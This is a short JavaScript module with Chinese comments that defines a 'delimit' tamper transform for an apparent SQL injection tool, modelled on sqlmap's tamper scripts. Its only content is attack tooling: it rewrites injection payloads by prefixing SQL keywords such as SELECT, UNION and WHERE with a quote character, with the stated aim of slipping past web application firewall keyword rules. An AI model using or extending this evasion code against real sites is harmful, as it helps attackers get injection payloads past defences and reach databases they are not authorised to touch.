// 分隔符编码：将 SQL 关键字/表达式用分隔符包绕，绕过 WAF 关键字检测规则
// 对标 sqlmap delimit.py，对关键字添加分隔符前缀
export const delimit = {
  name: 'delimit',
  description: '在 SQL 关键字前添加分隔符（\' 开头），绕过 WAF 关键字检测',
  transform(payload, ctx) {
    // 仅对以 SELECT/UNION/AND/OR/WHERE/FROM 等开头的短语添加分隔符
    return String(payload ?? '').replace(/\b(SELECT|UNION|AND|OR|WHERE|FROM|HAVING|ORDER|GROUP|LIMIT|OFFSET)\b/gi, "'$1");
  },
};
export default delimit;